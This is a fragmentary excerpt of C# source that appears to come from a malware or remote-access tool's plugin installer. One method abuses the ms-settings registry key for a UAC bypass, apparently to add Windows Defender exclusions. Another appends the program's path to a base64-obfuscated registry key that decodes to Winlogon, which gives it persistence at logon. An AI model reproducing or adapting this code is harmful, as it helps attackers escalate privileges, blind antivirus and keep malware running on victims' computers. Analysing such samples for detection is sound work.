...
namespace Plugin
{
    ...
    public static class Installer
    {
        ...
        public static void ExclusionWD()
        {
            try
            {
                var registryKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
                registryKey.SetValue(string.Empty,
                ...
                registryKey2.SetValue("DelegateExecute", string.Empty);
                registryKey2.Close();
        ...
        public static void InstallRegistry()
        {
            ...
            else if (!GetRegKey().Contains(Path.Combine(DirectoryName.FullName, FileName.Name)))
            {
                ...
                text = !(text == ",")
                    ...
                    : GetRegKey() + Path.Combine(DirectoryName.FullName, FileName.Name) + ",";
                var bytes2 =
                    Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=");
